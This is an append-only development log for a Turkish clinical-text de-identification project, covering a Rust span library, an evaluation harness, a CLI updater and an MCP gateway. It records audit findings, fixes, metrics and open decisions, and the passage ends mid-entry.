# PROGRESS — append-only session log

## Format

**This file is APPEND-ONLY.** Entries are never edited, never reordered, never deleted. A later
entry may correct an earlier one; it never rewrites it. The value of this file is that it is the
only record of what was *believed* at each point, and an edited log destroys exactly that.

**This file is the recovery point after context compaction.** It is written for a reader with total
amnesia: someone who has read `docs/PLAN.md`, knows nothing else, and needs to resume work. So every
entry names **files and line numbers**, never "the thing we discussed", never "the fix from
earlier". If a sentence would not survive being read by a stranger in six months, rewrite it.

**Loop invariant.** If `git status` is dirty and this file has no entry covering that work, the loop
is broken. Fix that before doing anything else.

Each entry has the shape:

```
## YYYY-MM-DD — <short title>
### CHANGED   what was built or modified, with paths
### BROKE     what was found wrong, and whether it is fixed or still open
### OPEN      known-unresolved items, by name
### NEXT      the single next task
```

The session protocol reads `docs/PLAN.md`, then the **last three entries here**, then
`docs/TASKS.md` — and states current milestone, next unchecked task and blockers **before** doing
any work.

---

## 2026-07-19 — M0 scaffold, golden set, eval harness, and the first audit

Milestone **M0** (golden set + eval harness). This is the first entry in this file; the project has
no git commits yet (`git log` is empty, so every `eval_sha` in `eval/results/` currently reads
`uncommitted`).

### CHANGED

**Rust core — `core/`, 1895 lines, 54 tests green (`cargo test --all`).**

- `core/src/lib.rs` — crate root. `#![forbid(unsafe_code)]`. No I/O, no network, no threads assumed
  (I1, D-006).
- `core/src/span.rs` (660 lines) — the `Span` type every layer speaks: byte offsets into the
  ORIGINAL text, `label`, `source: Layer`, `confidence: f32`, `text_hash: u64`. `Span::new` is the
  only constructor and validates UTF-8 char boundaries, so a mid-character span is unrepresentable.
  `union_widest()` (line 291) implements the L1+L2+L3 UNION: overlapping proposals merge to the
  widest hull, confidence combines by `noisy_or()` (line 132), the label follows the dominant
  (strongest-source) parent, and nothing is ever dropped. `Merged::is_protected()` (line 275) is the
  L4 no-demotion guarantee.
- `core/src/label.rs` (316 lines) — `EntityLabel`, mirroring `eval/schema.yaml`.
- `core/src/audit.rs` (229 lines) — `AuditEntry` / `AuditLog`. Offsets and metadata only, never the
  covered text. `rationale` is private, only settable on a `Layer::Context` span via
  `AuditEntry::with_rationale` (line 67), and `AuditLog::redacted()` (line 134) strips every
  rationale for any logging, export or persistence path (I4).
- `core/src/error.rs` (94 lines) — `thiserror` error type. No variant carries document text, covered
  text, or a model rationale.
- `core/src/pipeline.rs` (544 lines) — `Tier`, `Pipeline`, `DeidResult` skeleton.

**Eval harness — `eval/`, Python, 55 tests green (`python3 -m pytest tests/ -q`).**

- `eval/schema.yaml` + `eval/schema.py` — the label vocabulary across all three classes (A direct
  identifiers, B contextual quasi-identifiers, C the medical-term allowlist), validated structurally
  at load; a malformed schema fails loudly rather than scoring fewer entity types than claimed.
- `eval/thresholds.yaml` — the release gates. Header marks the file RAISE-ONLY (I2).
- `eval/build_gold.py` — resolves quote-anchored fixtures to UTF-8 **byte** offsets (D-009). A quote
  that will not resolve is a hard error, never a skip: a dropped gold span shrinks the recall
  denominator and inflates recall.
- `eval/allowlist.py` — loads `eval/allowlist/` as the negative-set vocabulary.
- `eval/harness.py` — the scoring engine. Three separate numbers, never blended.
- `eval/report.py` — gate evaluation and rendering.
- `eval/run.py` — CLI; writes `eval/results/<run_id>.json`, the card contract (I5).
- `justfile` — `check`, `verify-hooks`, `test-hooks`, `fmt`, `lint`, `test`, `eval`, `eval-commit`,
  `eval-gates`, `build-gold`, `test-airgapped`, `gate-tokenizer`, `red-team`, `publish`,
  `install-hooks`, `pull`.
- `scripts/hooks/pre_commit_phi.sh` — blocks a commit containing a checksum-VALID TCKN (I8).
  Installed in this clone as a symlink at `.git/hooks/pre-commit`; `just verify-hooks` asserts it.
- `scripts/gate_tokenizer.py` — the I6 backbone/language gate. `--self-test` is green offline,
  9 passed / 0 failed.
- `scripts/publish.py`, `scripts/card_template.md` — card generation from a results artifact only.

**Corpus, as counted by `python3 eval/build_gold.py` at the end of this session:**

| | count |
|---|---|
| documents total | **150** |
| gold notes (`eval/gold/gold_001_020..081_100.jsonl`, 5 files x 20) | 100 |
| adversarial fixtures (`eval/adversarial/`) | 50 |
| — `adv_direct.jsonl` | 14 |
| — `adv_medical_term.jsonl` | 12 |
| — `adv_contextual.jsonl` | 12 |
| — `adv_codeswitch.jsonl` | 12 |
| direct gold spans | **1447** |
| quasi gold spans | **210** |
| allowlist-term annotations (occurrences in fixture text) | **1176** |
| allowlist vocabulary (`eval/allowlist/`, 8 files) | **2102 terms / 2905 distinct lookup keys** |
| splits | dev 70, sight_unseen 30, adversarial 50 |

NOTE FOR A FUTURE READER: an earlier plan projected 112 gold notes and 62 adversarial fixtures.
Those are not the numbers in the repository. The counts above are what
`python3 eval/build_gold.py` printed against the working tree at the time of writing.

### M0 EXIT CRITERION AND THE EVIDENCE IT IS MET

> `just eval` runs on an empty detector and reports 0.0 recall across all direct entity types, 0%
> contextual coverage, and 0% medical-term false positives.

Evidence, from `python3 eval/run.py --detector null --out eval/results/latest.json`:

- **Recall 0.0 on every direct entity type.** All 32 `recall.<LABEL>` gates report observed
  `0.0000` and verdict `FAIL`. Micro recall (direct, relaxed) is `0.0000`. Crucially each of these
  has a real gold-span denominator, so `0.0000` is a measurement and not an absence.
- **Contextual coverage 0%** — `0.0000 (0/210 quasi spans)`.
- **Medical-term FP rate 0%** — `0.0000` against BOTH denominators: `0/1176` annotated occurrences
  and `0/1895` vocabulary occurrences (D-014). Masking nothing cannot destroy a clinical term; this
  asymmetry against 0.0 recall is the entire reason the three numbers are reported separately.
- **Contextual `reid_rate` is `null`, not `0.0`.** No L6 red-team report exists, so the contextual
  tier is UNVALIDATED. The report prints "Absence of an attack is not a survived attack." A harness
  that reported `0.0` here would let an unvalidated system read as validated.
- Gate summary: **1 passed, 34 failed, 4 UNENFORCEABLE.** The one pass is
  `medical_term_fp_rate_max`, which a null detector passes trivially and correctly.

The harness reports total failure honestly. M0's floor is demonstrated.

### BROKE — found by audit this session

**SEVERE 1 — `union_widest` cannot tell two detectors from one detector twice.**
`core/src/span.rs:291`. `Span` carries `source: Layer` (`Rules | Ner | Context`), which answers
"which architectural layer", not "which detector instance". The dedup at `core/src/span.rs:308`
collapses proposals on `(start, end, label, source)`. Two ENSEMBLE MEMBERS agreeing on identical
byte bounds are therefore indistinguishable from one model emitting the same span twice, and are
collapsed into `support == 1`. `Merged::is_protected()` (`core/src/span.rs:275`) reads
`support > 1`, so the L4 no-demotion guarantee fails **exactly where detector agreement is
strongest** — on exact boundary agreement, which is the best evidence the pipeline can produce.
The test at `core/src/span.rs:636` (`duplicate_proposals_do_not_manufacture_agreement`) pins the
current behaviour and reads as correct, because with only a `Layer` there is no way to write the
distinguishing case. STATUS: **decided, NOT yet implemented.** See `docs/DECISIONS.md` D-011
(`Span` grows a detector id) and D-012 (explicit `checksum_validated` flag). The code at
`core/src/span.rs` is unchanged as of this entry.

**SEVERE 2 — derived `Debug` on `AuditEntry` is a PHI egress path.**
`core/src/audit.rs:14` is `#[derive(Debug, Clone, PartialEq)]` on a struct whose private
`rationale: Option<String>` field (`core/src/audit.rs:44`) holds model-generated free text. An L3
rationale explains why a phrase re-identifies, and the natural way for a model to write that
sentence is to QUOTE THE PHRASE — so the rationale *is* the quasi-identifier. The derive means a
single `{:?}`, a panic message, an `unwrap` on a `Result<AuditEntry, _>`, or a binding's error path
prints it. `AuditLog::redacted()` (`core/src/audit.rs:134`) defends the deliberate export paths and
not the accidental ones, and the accidental ones are the ones that leak. `AuditLog` at
`core/src/audit.rs:97` derives `Debug` too and transitively prints every entry.
STATUS: **decided, NOT yet implemented.** See `docs/DECISIONS.md` D-013. `core/src/audit.rs` is
unchanged as of this entry.

**FIXED THIS SESSION — harness reporting defects.**

1. *Attack classes were not machine-readable.* `eval/build_gold.py` documented `attack` as "which of
   the L6 attack classes an adversarial fixture exercises", but every adversarial fixture stored a
   unique paragraph of prose and validation only checked that it was a string, so nothing could
   group or count by class. FIX: added the closed enum `ATTACK_CLASSES` (`eval/build_gold.py`,
   `L6_ATTACK_CLASSES` + `NON_L6_ATTACK_CLASSES`), made `attack_class` REQUIRED on every fixture
   under `eval/adversarial/`, made an unknown value a hard `GoldError`, and backfilled all 50
   existing adversarial fixtures by classifying their existing prose. Per I7 this added an
   annotation field only: no `text`, `spans`, `quasi_spans`, `label`, `quote`, `occurrence` or
   `attack` value on any existing line was touched. `attack_class_coverage()` and
   `render_attack_class_coverage()` (`eval/run.py`) now print fixture count per class on every eval
   run, **including classes at zero**. See D-015.
   IMMEDIATE FINDING: `structural_leakage` and `format_tells` have **0 fixtures**. Two of the seven
   L6 attack classes have nothing for the red team to run.
2. *`document_leak_rate` had a misleading denominator.* It divided by all documents, including those
   with zero direct gold spans, which cannot leak a direct identifier — reporting `0.8867 (133/150)`
   under a detector that finds nothing, which reads as if 11% of documents had been handled
   correctly. FIX: `eval/harness.py` now carries `documents_with_direct_spans`,
   `documents_without_direct_spans` and `document_leak_rate_over_leakable`, and emits
   self-documenting JSON keys (`document_leak_rate_over_documents_with_direct_spans`,
   `documents_excluded_no_direct_identifier`). The `document_leak_rate_max` gate now reads the
   leakable denominator: same numerator over a smaller denominator, so the observed rate is never
   lower — a strictly stricter gate, the only direction I2 permits. Current honest number:
   **1.0000 (133/133)**, with 17 documents excluded as unleakable.
3. *Two release gates could not fail under total failure.* `micro_f1_direct` and
   `checksum_id_precision` are precision-derived, and precision over an empty prediction set is
   undefined, so they rendered `n/a` and `Gate.passed` returned `True`. FIX: `eval/report.py`
   `Gate.passed` is now three-valued (`bool | None`), the verdict renders as `UNENFORCEABLE` and
   never as `PASS`, `unenforceable_gates()` and `gates_summary()` emit an explicit list plus
   passed/failed/unenforceable counts into `eval/results/<run_id>.json`, and `gates_summary`
   carries `all_gates_passed`, which is `false` whenever any gate is unenforceable. Tests:
   `tests/test_report.py`.
4. *The default eval path could not produce a publishable artifact.* `just eval` wrote only
   `eval/results/latest.json`, which is gitignored, while I5 requires a COMMITTED run. FIX: added
   the `eval-commit` recipe to `justfile`, which writes a timestamped, non-gitignored
   `eval/results/<run_id>.json` and PRINTS the `git add && git commit` command for a human to run.
   It never runs git itself; committing stays a human assertion (D-003).

### OPEN

- **D-010 — allowlist-versus-recall precedence.** `docs/DECISIONS.md` D-010, status OPEN. A
  single-model NAME span whose surface form collides with an allowlist entry (`Deva`, `Costa`) is
  deterministically kept and leaked, and recall loses to the allowlist, which I2 forbids. Blocks L4
  design in M4 and must be resolved before any Safe Harbor release.
- **L3 bitwise determinism across backends.** CUDA / CoreML / CPU / WebGPU produce different logits
  and near-ties flip under floating-point nondeterminism. Collides with the `eval_sha`
  reproducibility gate for every L3-dependent metric. No tolerance band defined.
- **`text_hash: u64` is brute-forceable.** `core/src/span.rs:71`, FNV-1a 64-bit, unkeyed. An
  attacker holding the span map can enumerate Turkish names and confirm a patient's presence,
  partially defeating "never store the text". Wants a keyed HMAC with a per-run secret salt plus a
  collision-handling policy for surrogate consistency.
- **`just check` runs eval in non-enforcing BASELINE mode.** `justfile` recipe `check` calls `eval`,
  not `eval-gates`. This is deliberate until M1: with a null detector every recall gate fails, and
  an enforcing default would make `just check` permanently red and create pressure to weaken the
  harness. It must be switched to `eval-gates` once L1 exists, or the gates are decorative.
- **Four gates are unenforceable under an empty prediction set.** `micro_f1_direct`,
  `checksum_id_precision` (both precision-derived), `contextual_reid_rate_max` (no red-team run),
  `sight_unseen_recall_drop_max` (dev recall is zero, so a drop from it is vacuous). They are now
  reported as UNENFORCEABLE rather than as passing, but they are still not enforceable, and they
  become enforceable only when a detector emits predictions (M1) and the red team exists (M5).
- **Two L6 attack classes have zero fixtures:** `structural_leakage`, `format_tells`.
- **The two SEVERE Rust defects above are decided but not implemented.** `core/src/span.rs` and
  `core/src/audit.rs` are unchanged.
- **Incumbent baseline is not run.** It needs network access and explicit human approval; see
  `docs/TASKS.md`.
- **`mypy --strict eval/` reports one residual error**, `eval/schema.py:23`, "Library stubs not
  installed for yaml". This is an environment gap (`types-PyYAML` is not installed and installing it
  is a network operation), not a code defect. Everything else is clean.

### NEXT

**Begin M1: the L1 deterministic rules layer, `core/src/rules/`.** First module `core/src/rules/tckn.rs`
under strict red-green-refactor TDD (TDD Layer A): write the known-INVALID vectors first and watch
them fail, then the known-valid vectors, then the checksum.

TCKN contract from the brief: 11 digits, `d1 != 0`,
`d10 = ((d1+d3+d5+d7+d9)*7 - (d2+d4+d6+d8)) mod 10`, `d11 = (d1+..+d10) mod 10`. Approach is
**over-match at regex, reject at checksum**; a checksum-valid match carries `confidence: 1.0` and is
never demoted downstream. Known failure modes to cover with fixtures that already exist in
`eval/adversarial/adv_direct.jsonl`: suffixed IDs (`12345678901'in`, adv-direct-0001), IDs glued
inside a word (adv-direct-0005), full-width and Arabic-Indic digits (adv-direct-0007), and
right-length numbers that are not a TCKN (adv-direct-0006).

Every TCKN written anywhere in the repository must be checksum-INVALID (I8); the pre-commit hook
rejects a valid one.

---

## 2026-07-19 — Four span-algebra defects from the external-crate re-audit

Still milestone **M0**. The previous round's Rust tests all ran inside `mod tests`, which is a child
of the crate and inherits its privileges, so none of them could see a defect about the PUBLIC API
surface. Four such defects. Fixed under strict TDD with the failing test written from OUTSIDE the
crate first: `core/tests/public_surface.rs` (new, integration test, separate compilation unit).

### CHANGED

- **F1 — `Span`'s safety flag was publicly forgeable. `core/src/span.rs`.** Every field of `Span`
  was `pub`, so the doc comment claiming `Span::checksum_validated` was "the only way to set" the
  flag was false from any other crate: `Span { checksum_validated: true, ..ner_span }` made an
  `Ner(3)` span at confidence 0.01 protected, and a struct literal equally bypassed all three
  invariants `Span::new` enforces (offset inside a `ş`, `confidence: 42.0`, `source: Rules` on an
  `Ner(0)` detector). The BREACH direction was worse: a binding author writing a literal for a
  genuinely checksum-valid TCKN and omitting the flag produced a DEMOTABLE checksum-valid
  identifier. Fields are now private with `#[must_use]` accessors — `start()`, `end()`, `label()`,
  `source()`, `detector_id()`, `confidence()`, `text_hash()`, `is_checksum_validated()`. Construction
  is `Span::new` or `Span::checksum_validated`, nothing else. `#[non_exhaustive]` was rejected: it
  blocks the external literal only, and the in-crate literals were the ones hiding F2.
- **F2 — the L4 guardrail was unfalsifiable. `core/src/span.rs`.** `Merged::support` counted merge
  events after a byte-identical dedup, not distinct detector ids as its own doc comment and
  `is_protected()` both claimed. With a SINGLE `Ner(0)`: two overlapping-but-not-identical proposals
  gave `support: 2` and protected, as did two identical-bounds different-label proposals. `Merged`
  now stores the sorted SET of contributing `DetectorId`s; `support()` is its cardinality.
- **F2 semantics, decided and documented.** Transitive chains ARE counted and agreement does NOT
  require a commonly-agreed byte range: an A-B, B-C chain of three detectors reports 3 even where A
  and C share no byte. Deliberate over-approximation — `support`'s only consumer forbids demotion,
  so the stricter reading would make chained spans demotable, and demotion is the breach direction
  (I2). Written into the `Merged::support` doc comment and asserted in the chain test.
- **F3 — merged provenance named the wrong detector. `core/src/span.rs`.** `union_with` took the
  label from `dominates()` but `detector_id` from `min()` of the parents, so merging
  `Ner(0)@"Ayşe"` with the wider `Ner(1)@"Ayşe Yılmaz"` reported `Ner(0)` over `Ner(1)`'s label and
  bounds. Label, source and detector id now all come from the dominant parent; the parents that lost
  are kept in `Merged::contributors()`. Nothing egressed the wrong claim today only because
  `AuditEntry` records `layer` and not `detector_id` — recording the detector is the obvious next
  entry, which is why this was fixed now rather than when it bites.
- **F4 — `Merged::support` was forgeable, and the repo's own tests forged it.** Fields are now
  private. `Merged::single` (support 1, the weakest value the type can hold) and `union_widest` are
  the only construction paths. The `Merged { span, support: 2 }` and `support: 3` literals in
  `core/src/pipeline.rs`'s tests are replaced by merges of proposals that actually exist, so the
  guardrail is now shown reacting to evidence the merge counted.
- **Call sites updated.** `core/src/audit.rs` (`AuditEntry::new`, `with_rationale`),
  `core/src/pipeline.rs` (`demote_to_keep`, `Pipeline::adjudicate`, `Pipeline::apply`) and every
  in-crate test now read through accessors.
- **`docs/DECISIONS.md` D-016** records all four, the rejected alternatives, and the residual gaps.

### BROKE / STILL OPEN

- **A compile-fail test would be strictly stronger and is not present.** An integration test can
  only assert about code that COMPILES, so `core/tests/public_surface.rs` asserts the observable
  consequence (every obtainable span satisfies the invariants; no reachable path yields unearned
  protection) rather than "this struct literal is rejected". A `trybuild` compile-fail suite asserts
  on rustc's diagnostics directly. Not added because the dependency must be fetched over the
  network. The limitation is written at the top of the test file.
- **One detector can still inflate its own CONFIDENCE.** Two overlapping-but-not-identical proposals
  from the same `DetectorId` still noisy-OR together, so a single model can push a span past
  `ESCALATION_CONFIDENCE_MAX` by proposing two ranges. `union_widest`'s dedup catches only the exact
  byte-identical case. `support` is now immune to this; confidence is not. Untracked before this
  entry.
- **`Merged` now allocates** a `Vec<DetectorId>` per merged region. `Span` stays `Copy` and
  allocation-free. A `SmallVec` or an ensemble-slot bitset is the fix if it ever shows in a profile.
- Everything listed as open in the previous entry remains open.

### NEXT

Unchanged from the previous entry: **begin M1, the L1 deterministic rules layer, starting with
`core/src/rules/tckn.rs`** under strict red-green-refactor. The rules layer is the first caller that
will build spans in bulk, and it is now structurally unable to mint one that skips validation or to
claim a checksum it did not run — which is the whole point of doing this before M1 rather than after.

## Eval defect round: allowlist expansion, the FP gate, drift enforcement, clause-medial quasi fixtures

### CHANGED

- **`eval/allowlist.py:key_variants` no longer merges distinct Turkish words.** The dotted/dotless
  expansion added alongside the casefold fix indexed both `ı`->`i` and `i`->`ı` for every term. Over
  the 174-document corpus that made 14 tokens of `dış` ("outer") match the ANATOMY entry `diş`
  ("tooth") — 14 phantom medical terms in the `fp_rate_vocabulary` denominator, and a common function
  word allowlisted at L4. The expansion is now gated on `_is_ascii_origin(key)` and, for the
  `ı`->`i` direction, on an ASCII capital `I` actually appearing in the source spelling. The fold
  itself is untouched. `dış` no longer resolves; `MRI'da`, `ISIL` and `Infective endocarditis` still
  do. D-017.
- **`eval/report.py:medical_term_fp_rate_max` gates on the worse of both denominators.** It read the
  ANNOTATED rate only, so a probe detector masking every occurrence of `ameliyat` (in the vocabulary
  files, annotated in zero fixtures) destroyed 25 medical terms and scored PASS. `observed` is now
  `max(fp_rate_annotated, fp_rate_vocabulary)`; both are still printed; the gate is UNENFORCEABLE only
  when neither denominator exists. D-018.
- **Seven drift terms reconciled, drift enforcement wired into `check`.** New class C category
  `DEVICE` (`eval/allowlist/device.txt`: `lead`, `monitör`, `sensör`, `walker`) declared in
  `eval/schema.yaml`; `rebound` added to `diagnosis.txt`; `Monitörde` added to `code_switched.txt` as
  the inflected form of `monitör`, not as a second term. The two remaining items (`costa 6`,
  `Deva marka parasetamol`) are phrases over vocabulary that is already present and are listed in
  `eval.allowlist.DRIFT_EXCEPTIONS` with a reason each. `--strict` fails on unjustified drift only,
  `validate_drift_exceptions` refuses an exception whose head token is not class C, and
  `just check` now depends on `just drift-check`. D-019.
- **`eval/gold/gold_113_116.jsonl`** adds gold-0113..0116 (RELATIONSHIP_REF, ASSET_LOCATION,
  EMPLOYER_ROLE, RARE_ATTRIBUTE_COMBO), each quasi span clause-medial — preceded by `;` or `,` inside
  a sentence, never at a sentence start. Corpus 174 -> 178 documents, quasi spans 225 -> 229.
- **Tests.** `tests/test_allowlist.py`: `dış` does not match `diş` in either the index or the corpus
  scanner, Turkish words are not expanded in either direction, ASCII-origin vocabulary still resolves
  both readings, the seven reconciled terms are present under the right categories, residual drift is
  zero, an exception cannot hide a missing term, `--strict` exits 1 when one is removed.
  `tests/test_report.py`: the `ameliyat` probe detector now FAILS the medical-term gate.

### BROKE / STILL OPEN

- **Three earlier quasi-only gold spans are sentence-INITIAL and were left alone (I7).** `gold-0102`
  RELATIONSHIP_REF (bytes 368-416), `gold-0105` ASSET_LOCATION (252-297) and `gold-0111`
  RARE_ATTRIBUTE_COMBO (116-288) all start immediately after a sentence boundary. They are
  mid-document and not headers, so they are weakened rather than broken: a detector could in
  principle pick them up on position rather than on meaning. The four new fixtures cover the same
  categories clause-medially; a human should decide whether the three are worth superseding.
- **`mypy --strict eval/` reports one PRE-EXISTING error** unrelated to this work:
  `eval/schema.py:23: Library stubs not installed for "yaml"`. `types-PyYAML` cannot be installed
  without network access, and `eval/schema.py` was not touched here.
- **An ASCII-only Turkish word whose `i`/`ı` twin is also a real word could still merge** (`ısı` vs
  `isi`). Nothing in the current vocabulary is in that class. See D-017.
- **1266 vocabulary terms are never annotated in any fixture**, so the gate never exercises them.
  Unchanged by this round and reported by `just allowlist-drift` in the other direction.
- **Two of seven L6 attack classes still have no fixture** (`structural_leakage`, `format_tells`).

### NEXT

Unchanged: **begin M1, the L1 deterministic rules layer, starting with `core/src/rules/tckn.rs`**
under strict red-green-refactor.

## bindings/cli — the CLI skeleton and the opt-out auto-updater

### CHANGED

- **New crate `bindings/cli/` (`deid-tr-cli`, binary `deid`)**, added to the workspace members in
  `Cargo.toml`. Network dependencies (`reqwest` blocking + rustls, `minisign-verify`, `sha2`) live
  here and only here; `core/` is untouched and still has no network dependency (I1).
- `bindings/cli/src/config.rs` — precedence CLI flag > env var > config file > default, resolved as a
  pure function of injected inputs so no test mutates process-global state.
- `bindings/cli/src/update.rs` — policy, air-gap detection with 24h suppression, staging, activation
  with a `.previous` rollback copy. Module header carries the complete inventory of what is and is
  not sent.
- `bindings/cli/src/verify.rs` — real Ed25519 signature verification over the manifest (legacy
  downgrade refused) plus SHA-256 over the artifact. `Trust::Full` is the only state that installs.
- `bindings/cli/src/transport.rs` — the only socket in the product. Two GETs, redirects refused,
  response size capped, artifact paths sanitised before use because the manifest is unverified when
  they are read.
- `bindings/cli/src/mask.rs` — `deid mask`, wired to `Pipeline::deidentify`. Cannot name any
  networking module; enforced by `bindings/cli/tests/mask_path_is_offline.rs`.
- `bindings/cli/src/notice.rs` — the one-line first-run disclosure, stderr, marker in the state dir.
- `docs/DECISIONS.md` — appended **D-020** (requested as D-016; that number was taken).

50 tests, all green: `cargo test -p deid-tr-cli` (46 unit + 4 structural).

### BROKE

- Nothing in `core/`. `bindings/cli` is clippy-clean (`0` findings under `--all-targets`).
- **Pre-existing and NOT mine:** `cargo clippy --all-targets -- -D warnings` fails on `deid-tr-core`
  with 21 errors (unused imports and never-used `pattern_ok` / `is_real_date` / `MONTHS` /
  `CHECKSUM_ABSENT` across `core/src/rules/*`), from the in-flight M1 rules work. `just check` is red
  until those are resolved by whoever owns that change.

### NEXT

- The project owner must generate a minisign release keypair and set `update_public_key` before
  auto-install can ever happen. Until then the updater is notify-only by construction — see D-020
  mitigation 6.
- No release host exists yet, so `update_host` is unset and an unconfigured install sends nothing.
- `deid pull` is declared and exits 2 as unimplemented; it lands with M3.

## L1 precision round: VKN interior windows, date roles, MRN width

### CHANGED

- `core/src/rules/vkn.rs` — a ten-digit window found strictly INSIDE a longer digit run may no
  longer claim `checksum_validated` on a one-digit check alone. It needs corroboration: a run
  boundary (the run is exactly ten digits) or a `Vergi`/`VKN` cue on the same line within 48 bytes.
  VKN has ONE check digit and no issuing rule, so a random window passes one time in ten; every
  eleven-digit TCKN carries two windows, and the result was 44 checksum-VALIDATED — therefore
  undemotable by L4 — false positives against 4 true positives. Module header now documents which
  issuing rules VKN has (none: no leading-zero ban, no all-same reservation, unlike TCKN) rather
  than inventing one. New regression test generates checksum-valid TCKNs at run time (I8) and
  asserts neither of their windows mints a validated VKN.
- `core/src/rules/vkn.rs` header — the "HAS NOT BEEN VERIFIED AGAINST PUBLISHED VALID/INVALID
  VECTORS" caveat is retracted. The algorithm was checked step for step against a published
  statement and against the specimen `1729171602`, which this implementation accepts. An inaccurate
  safety caveat teaches readers to ignore caveats.
- `core/src/rules/date.rs` — role is now cue-derived, nearest-cue-wins, line-bounded, looking both
  backward (44 bytes) and forward (18 bytes) because Turkish puts the cue on either side. No cue in
  reach means `EntityLabel::Date`, not a guess. Cue matching requires a leading word boundary, which
  is what stops `ölüm` matching inside `bölümümüzce`.
- `core/src/label.rs`, `eval/schema.yaml` — new direct label `DATE`. See D-021.
- `core/src/rules/mrn.rs` — value pattern accepts a 1-4 letter department prefix
  (`ACL-2026-004212`, `RIS-2026-0431-77`, `OZL-0004312`), the number-word is optional so narrative
  `protokol 2026-0055418` matches, `istem` joins the cue list with a leading `\b`, and an
  unaccompanied cue must be followed by a record-SHAPED value.
- `docs/DECISIONS.md` — appended D-021 and D-022.

Rules-layer eval, 178 documents, before -> after: `checksum_id_precision` 0.6871 -> 0.9806;
VKN 0.0833 -> 1.0000 precision at recall 1.0000; MRN recall 0.8421 -> 1.0000 at precision 0.9744;
DATE_BIRTH precision 0.3285 -> 0.9890 at recall 1.0000; DATE_ADMISSION 0.0000 -> 0.5742 recall,
DATE_DISCHARGE 0.0000 -> 0.7917, DATE_DEATH 0.0000 -> 0.6667. No entity's recall decreased.
Micro F1 0.4149 -> 0.5423.

### BROKE

- Nothing. `cargo fmt`, `cargo clippy --all-targets -- -D warnings`, `cargo test --all` (171),
  `pytest tests/` (103) all green.
- `checksum_id_precision` does NOT reach its 1.000 gate; the residue is two deliberate
  checksum-FAILED emissions and a metric/name mismatch in `eval/harness.py`. D-022 states the two
  options and neither is taken unilaterally.
- MRN precision is 0.9744, not 1.0000. The four remaining false positives are all
  `Konsey Kayıt No: TK-2026-0117`, which gold labels `OTHER_UNIQUE_ID`; the bytes are a real
  identifier and are masked either way, so this is a label disagreement rather than a spurious
  detection.

### NEXT

- A human decides D-022 (metric restricted to validated spans, or gate acknowledged unreachable)
  and adds `DATE: 0.97` to `eval/thresholds.yaml` per D-021.
- DATE_ADMISSION recall 0.5742 is now an honest number and the next thing to raise: the misses are
  narrative encounter dates with no cue at all, which is L2/L4 work, not a wider regex.

## 2026-07-19 — M2: the stdio MCP gateway

### CHANGED

- **New crate `bindings/mcp/` (`deid-tr-mcp`, binary `deid-mcp`)**, added to the workspace in
  `Cargo.toml:3`. Dependencies: `deid-tr-core`, `getrandom` (CSPRNG for session handles and
  token nonces), `serde_json`, `thiserror`. No socket-capable dependency, deliberately (D-026).
- `src/server.rs` — MCP dispatch: `initialize`, `ping`, `tools/list`, `tools/call`. Four tools:
  `deidentify`, `reidentify`, `forget`, `health`. `Server::run` is the newline-delimited
  JSON-RPC loop over stdin/stdout; `Server::handle` processes one line and returns `None` for a
  notification.
- `src/session.rs` — `SessionStore`. Handles are 128 bits from the OS CSPRNG. TTL default 900 s
  **from creation, not last use**, on a monotonic `Instant` so a clock step cannot extend a
  session. Expiry sweeps on every access rather than by a timer. `Secret(Vec<u8>)` overwrites
  its buffer in `Drop` with no `unsafe`. `Clock` is a trait so expiry is tested by advancing
  time, not by sleeping.
- `src/surrogate.rs` — reversible bracketed tokens and the single-pass substitution that undoes
  them. See D-025 for why neither the pipeline's fallback placeholder nor core's real L5
  surrogates can serve this path.
- `src/telemetry.rs` — stderr-only structured logging. `Event` accepts `usize`, `EntityLabel`
  and `&'static str` and nothing else, so there is no type-level path from a document to a log
  line (I4). Session handles are never logged; `Session::sequence()` is the correlation id.
- `src/error.rs` — `GatewayError`, no `String` field anywhere. `SessionNotFound` is deliberately
  undifferentiated: there is no `SessionExpired` variant and there must never be one.
- `src/jsonrpc.rs` — envelope parse/emit. `Request` has a hand-written `Debug` that redacts
  `params`, for the same reason `core`'s `DeidResult` does: `params` is where the note arrives.
- `bindings/mcp/README.md` — client registration, tool table, retention policy, network posture.
- `justfile` — new recipes `mcp-build`, `mcp-run`, `mcp-health`, `mcp-check`, `mcp-no-socket`;
  `mcp-no-socket` added to the `check` gate at `justfile:22`.

### BROKE

- Nothing. `cargo fmt --all`, `cargo clippy --all-targets -- -D warnings`, `cargo test --all`
  all green. 58 tests in the new crate (30 unit, 28 integration across `round_trip.rs`,
  `session_isolation.rs`, `stdio_protocol.rs`, `no_listener.rs`).
- Corrected mid-task: `health` originally reported a HARDCODED layer list saying "L2 is a stub,
  milestone M3". `core/` gained a real L2 ensemble and a real L5 engine during this session, and
  the hardcoded list would have gone on asserting the old state. `Server::layer_status` now
  derives every `live` from the pipeline it actually holds (`ensemble().len()`,
  `surrogate().is_some()`, the configured tier). A health endpoint that describes the code as it
  stood when someone last edited it is worse than none.

### OPEN

- **Names are not masked.** The gateway registers no detector, so L2 proposes nothing and only
  L1's deterministic rules run. `health` reports `L2.live: false` and `L2.detectors: 0`, and
  `bindings/mcp/README.md` says so under Status. Wiring `bindings/ort` in is M3 work.
- Zeroisation is best-effort and documented as such in the `session.rs` module header: it cannot
  erase copies left by a reallocation, by stack slots, or by swap. The TTL is the primary
  control and zeroisation is defence in depth.
- The session store is single-owner and the loop is single-threaded. Isolation between
  concurrent sessions is tested (`tests/session_isolation.rs`), but if a future transport
  multiplexes, the store needs a lock and that test needs real threads.

### NEXT

- M3: register a real detector with the gateway so L2 contributes, then re-run
  `tests/round_trip.rs` — the round trip must stay byte-exact once names are masked, which it
  has never been exercised against.

---

## 2026-07-19 — the contextual gate now measures the product, and the checksum gate admits it cannot

### CHANGED

- **`eval/rust-bridge/`** (new workspace member, binary `deid-eval-bridge`, `publish = false`).
  Reads `{tier, documents[]}` on stdin, runs the real `core::Pipeline` per document with a
  doc_id-derived `SaltScope::Document` salt, writes `{detector, documents[{deid_text, spans[]}]}`
  on stdout. Each span carries `decision`, `replacement`, `confidence`, `rationale` and
  `checksum_validated`. Deps are `deid-tr-core` + `serde_json` + `thiserror`, all already in the
  lock, so `cargo build --offline` still resolves and `just test-airgapped` is unaffected.
- **`eval/pipeline.py`** (new). `PipelineMasker` (red team) and `PipelineDetector` (harness), both
  declaring the identity `pipeline:safe_harbor`. One bridge process per corpus.
- **`eval/redteam/runner.py`** — `--masker pipeline` added and made the DEFAULT. The report now
  splits `reid_rate_measured` (always) from `contextual_reid_rate` (gate-eligible, null for every
  reference masker) and carries a `provenance` block (`detector`, `eval_sha`, `schema_sha`,
